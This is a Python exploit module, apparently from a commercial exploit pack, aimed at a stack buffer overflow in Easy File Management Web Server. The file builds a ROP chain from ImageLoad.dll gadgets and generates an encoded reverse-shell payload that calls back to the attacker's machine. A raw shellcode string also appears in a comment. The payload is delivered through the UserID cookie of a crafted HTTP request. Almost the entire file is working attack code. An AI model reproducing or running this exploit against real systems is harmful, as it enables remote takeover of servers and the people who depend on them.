# -*- coding: utf-8 -*-
#!/usr/bin/python
# The exploit is a part of Agora pack - use only under the license agreement
# specified in LICENSE.txt in your Agora distribution

import sys
import re
import os
import socket
from struct import pack
import socket,sys
import os
import time

sys.path.append("./core")
sys.path.append("./shellcodes")
from Sploit import Sploit
from Shellcodes import OSShellcodes


INFO={}
INFO['NAME']="ef_easyfile_webserver_sbo"
INFO['DESCRIPTION']="Easy File Management Web Server Stack Buffer Overflow"
INFO['VENDOR']="http://www.sharing-file.com/"
INFO["CVE Name"]="N/A"
INFO["NOTES"]="""
    Stack buffer overflow
    Tested on win xp sp2
    """
INFO['CHANGELOG']="14 July, 2015. Written by Gleg team."
INFO['PATH'] = "Exploits/"

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "192.168.1.233"
OPTIONS["PORT"] = "80"

class exploit(Sploit):
    def __init__(self,host="",
                port=0,
                logger=None):
        Sploit.__init__(self,logger=logger)
        self.port = port
        self.host = host
        self.name = INFO['NAME']
        return

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.path = int(self.args.get('PORT', self.port))
        return

    def create_shellcode(self):
        self.log("[] Generate shellcode started")
        badstring = ["\x00", "\x0a", "\x0d", "\x3b"]
        self.CONNECTBACK_IP = socket.gethostbyname(socket.gethostname())
        port = 5555
        if self.args['listener']:
            port = int(self.args['listener']['PORT'])
        self.CONNECTBACK_PORT = port
        os_system = os_target = "WINDOWS"
        os_arch = '32bit'
        shellcode_type = 'reverse'
        s = OSShellcodes(os_target, os_arch, self.CONNECTBACK_IP, self.CONNECTBACK_PORT, badstring)
        shellcode = s.create_shellcode(
            shellcode_type,
            encode='alphanum',
            debug=1
        )
        print(shellcode)
        self.log("Shellcode type: %s for arch: %s" % (shellcode_type, os_arch))
        self.log("Length of shellcode: %d" % len(shellcode))
        self.log("[] Generate shellcode finished")
        return shellcode

    def run(self):
    	self.args()
    	
        host=self.host
        port=self.path
        junk0 = "\x90" * 80
        call_edx=pack('<L',0x1001D8C8)
        junk1="\x90" * 396
        ppr=pack('<L',0x10010101) # POP EBX # POP ECX # RETN [ImageLoad.dll]
        crafted_jmp_esp=pack('<L',0xA4523C15)
        test_bl=pack('<L',0x10010125) # contains 00000000 to pass the JNZ instruction
        kungfu=pack('<L',0x10022aac)  # MOV EAX,EBX # POP ESI # POP EBX # RETN [ImageLoad.dll]
        kungfu+=pack('<L',0xDEADBEEF) # filler
        kungfu+=pack('<L',0xDEADBEEF) # filler
        kungfu+=pack('<L',0x1001a187) # ADD EAX,5BFFC883 # RETN [ImageLoad.dll] # finish crafting JMP ESP
        kungfu+=pack('<L',0x1002466d) # PUSH EAX # RETN [ImageLoad.dll]
        nopsled="\x90" * 20

        shellcode = self.create_shellcode()
        # shellcode = ("\xeb\x24\x5e\x31\xc9\xb1\x44\x80\x3e\x0d\x7c\x05\x80\x2e\x0d\xeb\x10\x31\xd2\xb2\x0d\x2a\x16\x31\xdb\xb3\xff\x43\x66\x29\xd3\x88\x1e\x46\xe2\xe3\xeb\x05\xe8\xd7\xff\xff\xff\x09\xf5\x8f\x0d\x0d\x0d\x6d\x96\xf2\x3e\xcd\x71\x98\x5d\x3d\x98\x5f\x19\x98\x5f\x21\x98\x7f\x35\x1c\xc4\x57\x33\x3e\x0c\xb9\x49\x6e\x89\x0f\x39\x2d\xce\xdc\x1a\x0e\xd4\xef\xff\x5f\x64\x98\x5f\x1d\x98\x57\x49\x98\x59\x1e\x85\xf0\x55\x0e\xde\x5e\x98\x66\x2d\x0e\xe0\x98\x56\x25\xf0\x47\x56\x98\x41\x98\x0e\xe3\x3e\x0c\xb9\xce\xdc\x1a\x0e\xd4\x45\xed\x82\x03\x10\x8a\x05\x48\x8a\x31\x82\xf1\x65\x98\x65\x31\x0e\xe0\x73\x98\x19\x58\x98\x65\x29\x0e\xe0\x98\x11\x98\x0e\xdd\x96\x51\x31\x31\x68\x68\x6e\x66\x67\x5e\x0c\xed\x6c\x6c\x67\x98\x1f\xf8\x9a\x6a\x75\x40\x3f\x0d\x0d\x75\x84\x80\x3f\x6c\x61\x75\x59\x84\x33\x14\x0c\xe2\xc5\x9d\x0e\x0d\x0d\x36\xd1\x61\x5d\x75\x36\x8d\x78\x0d\x0c\xe2\x5d\x5d\x5d\x5d\x4d\x5d\x4d\x5d\x75\xf7\x1c\xec\xed\x0c\xe2\xa4\x77\x12\x75\xcd\xb5\x45\x0e\x75\x0f\x0d\x1c\xae\x96\xf3\x77\x1d\x63\x64\x75\xa6\xb2\x81\x6e\x0c\xe2\x92\xcd\x81\x19\x0c\x5b\x15\x82\xf9\x75\xfd\xc2\xaf\x63\x0c\xe2\x75\x70\x7a\x71\x0d\x96\xf0\x64\x64\x64\x3e\x03\x77\x1f\x66\x63\xef\x0a\x73\xd4\x51\x31\x49\x0e\x0e\x9a\x51\x31\x1d\xd3\x0d\x51\x61\x5d\x63\x63\x63\x53\x63\x5b\x63\x63\x60\x63\x75\x86\xd9\x4c\x93\x0c\xe2\x96\xed\x5b\x63\x53\x0c\x3d\x75\x15\x94\x2a\x6d\x0c\xe2\xc8\xfd\xc2\xaf\x63\x75\xb3\xa2\xca\xaa\x0c\xe2\x49\x13\x89\x17\x8d\x08\xed\x82\x12\xc8\x54\x20\x7f\x7c\x77\x0d\x60\x0c\xe2")
        payload=junk0 + call_edx + junk1 + ppr + crafted_jmp_esp + test_bl + kungfu + nopsled + shellcode
        buf="GET /vfolder.ghp HTTP/1.1\r\n"
        buf+="User-Agent: Mozilla/4.0\r\n"
        buf+="Host:" + host + ":" + str(port) + "\r\n"
        buf+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buf+="Accept-Language: en-us\r\n"
        buf+="Accept-Encoding: gzip, deflate\r\n"
        buf+="Referer: http://" + host + "/\r\n"
        buf+="Cookie: SESSIONID=1337; UserID=%s; PassWD=;\r\n"
        buf+="Conection: Keep-Alive\r\n\r\n"
        buf = str(buf) % payload

        print "[*] Connecting to Host " + host + "..."
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
        	connect=s.connect((host, port))
        	print "[*] Connected to " + host + "!"
        except:
        	print "[!] " + host + " didn't respond\n"
        	self.finish(False)
        	return 0
        print "[*] Sending malformed request..."

        s.send(buf)
        time.sleep(1)
        print "[!] Exploit has been sent!\n"
        s.close()
        self.finish(True)
        return 1
if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()